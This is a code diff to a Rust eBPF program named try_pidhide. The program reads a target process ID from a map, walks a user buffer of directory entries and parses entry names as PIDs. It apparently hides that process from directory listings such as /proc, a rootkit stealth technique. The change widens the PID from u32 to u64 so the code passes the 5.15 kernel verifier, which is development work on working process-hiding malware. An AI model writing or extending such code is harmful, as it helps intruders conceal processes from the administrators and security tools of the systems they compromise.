@@ -128,7 +128,12 @@ fn try_pidhide(ctx: &FExitContext) -> Result<i32, i32> {
 
     let target = match TARGETS.get(0) {
         Some(0) | None => return Ok(0),
-        Some(pid) => *pid as u32,
+        // The target rides the slot's own u64 - the u32 truncation
+        // the first shape rode forces the 5.15 verifier's precision
+        // backtracking through a partially-tracked stack slot at the
+        // walk's door (the machine-named EFAULT at the walk's first
+        // step), and a pid fits the u64 compare exactly as well.
+        Some(pid) => *pid,
     };
 
     // The entry chain: walk the user buffer through tiny probe reads
@@ -198,15 +203,16 @@ fn try_pidhide(ctx: &FExitContext) -> Result<i32, i32> {
 
 /// Parse the dirent name's leading decimal digits into a pid. A name
 /// that is not a decimal pid (the root's own "." / "..", the
-/// non-numeric files) reads as None.
-fn parse_pid(name: &[u8; NAME_READ]) -> Option<u32> {
-    let mut pid: u32 = 0;
+/// non-numeric files) reads as None. The pid rides the u64 the
+/// control slot carries - no truncation in the compare.
+fn parse_pid(name: &[u8; NAME_READ]) -> Option<u64> {
+    let mut pid: u64 = 0;
     let mut digits = 0;
     for byte in name {
         match byte {
             0 => break,
             b'0'..=b'9' => {
-                pid = pid.wrapping_mul(10).wrapping_add((byte - b'0') as u32);
+                pid = pid.wrapping_mul(10).wrapping_add((byte - b'0') as u64);
                 digits += 1;
             }
             _ => break,
